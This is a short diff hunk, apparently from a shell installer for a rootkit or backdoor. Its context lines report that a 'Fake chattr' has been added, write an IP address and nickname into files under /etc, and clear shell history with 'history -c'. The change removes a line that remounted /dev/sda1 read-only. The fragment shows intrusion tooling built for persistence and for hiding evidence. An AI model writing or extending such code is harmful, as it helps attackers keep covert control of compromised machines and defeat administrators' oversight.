@@ -61,7 +61,6 @@ echo "------------------Fake chattr successfully added-----------------"
 echo "-----------------------------------------------------------------"
 echo "$IP" > /etc/HOST &
 echo "$nick" > /etc/nick &
-sudo mount -o remount,ro /dev/sda1
 history -c
 echo
 echo "-----------------------------------------------------------------------------"
